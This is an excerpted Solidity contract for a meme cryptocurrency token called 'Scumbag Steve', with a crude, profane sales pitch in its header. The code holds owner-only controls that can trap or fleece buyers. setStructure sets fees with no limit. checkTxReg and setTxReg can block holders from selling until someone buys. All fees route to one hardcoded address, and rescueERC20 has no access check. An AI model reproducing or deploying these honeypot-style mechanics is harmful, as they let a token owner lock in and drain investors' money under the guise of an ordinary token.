/*
   ...
   Wsup u scumbag, wanna see sumn cool? Come check this out, we sellin some gud $SS here! 
   Hold this shit and get ready cause we all about to get high af u mf

    KYM: https://knowyourmeme.com/memes/scumbag-steve
    Not my web kek: https://www.scumbagsteve.com/


    https://t.me/iamscumbagsteve
...
contract steve is IERC20, tokenStaking, Ownable {
    using SafeMath for uint256;
    string private constant _name = 'Scumbag Steve';
    ...
    uint256 private OperationsFee = 200;
    ...
    bool public TxReg = true;
    uint256 public TxRegSells;
    uint256 public TxRegTrigger = 3;
    bool public TxRegBuyNeeded = false;
    uint256 private swapTimes;
    bool private swapping;
    uint256 private swapAmount = 3;
    uint256 private swapThreshold = ( _totalSupply * 500 ) / 100000;
    uint256 private minTokenAmount = ( _totalSupply * 10 ) / 100000;
    uint256 public TxRegMinAmount = 1;
    modifier lockTheSwap {swapping = true; _; swapping = false;}
    mapping(address => uint256) public amountStaked;
    uint256 public totalStaked;
    stakeIntegration internal stakingContract;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal Dev_receiver = 0xf87f47c97A211e110042e3ccbcfEC65a2649695F; 
    address internal Operations_receiver = 0xf87f47c97A211e110042e3ccbcfEC65a2649695F;
    address internal liquidity_receiver = 0xf87f47c97A211e110042e3ccbcfEC65a2649695F;
    address internal staking_receiver = 0xf87f47c97A211e110042e3ccbcfEC65a2649695F;
    ...
    event SetInternalAddresses(address indexed Operations, address indexed liquidity, address indexed Dev, uint256 timestamp);
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        checkTxReg(sender, recipient, amount);
    ...
    function setStructure(uint256 _liquidity, uint256 _Operations, uint256 _token, uint256 _Dev, uint256 _staking, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        liquidityFee = _liquidity; OperationsFee = _Operations; tokenFee = _token; stakingFee = _staking;
        DevFee = _Dev; totalFee = _total; sellFee = _sell; transferFee = _trans;
    ...
    function checkTxReg(address sender, address recipient, uint256 amount) internal {
        if(TxReg && !swapping){ 
        if(recipient == pair && !isFeeExempt[sender]){TxRegSells = TxRegSells.add(uint256(1));}
        if(sender == pair && !isFeeExempt[recipient] && amount >= TxRegMinAmount){TxRegSells = uint256(0);}
        if(TxRegSells > TxRegTrigger){TxRegBuyNeeded = true;}
        if(TxRegBuyNeeded && !isFeeExempt[recipient] && !isFeeExempt[sender]){
            require(sender == pair, "ERC20: TxReg purchase required"); if(amount >= TxRegMinAmount){TxRegSells = uint256(0); TxRegBuyNeeded = false;}}}
    }

    function setTxReg(bool enabled, uint256 trigger, uint256 minAmount) external onlyOwner {
        TxReg = enabled; TxRegTrigger = trigger; TxRegMinAmount = minAmount;
    }
    ...
    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        uint256 _denominator = (liquidityFee.add(1).add(OperationsFee).add(DevFee).add(stakingFee)).mul(2);
        ...
        uint256 OperationsAmount = unitBalance.mul(2).mul(OperationsFee);
        if(OperationsAmount > 0){payable(Operations_receiver).transfer(OperationsAmount);}
        uint256 stakingAmount = unitBalance.mul(2).mul(stakingFee);
        if(stakingAmount > 0){payable(staking_receiver).transfer(stakingAmount);}
        if(address(this).balance > uint256(0)){payable(Dev_receiver).transfer(address(this).balance);}
    }
    ...
    function setInternalAddresses(address _Operations, address _liquidity, address _Dev, address _staking, address _token) external onlyOwner {
        Operations_receiver = _Operations; liquidity_receiver = _liquidity; Dev_receiver = _Dev; staking_receiver = _staking; token_receiver = _token;
        isFeeExempt[_Operations] = true; isFeeExempt[_liquidity] = true; isFeeExempt[_staking] = true; isFeeExempt[_token] = true;
        emit SetInternalAddresses(_Operations, _liquidity, _Dev, block.timestamp);
    }
    ...
    function rescueERC20(address _address, uint256 _amount) external {
        IERC20(_address).transfer(Dev_receiver, _amount);
    }
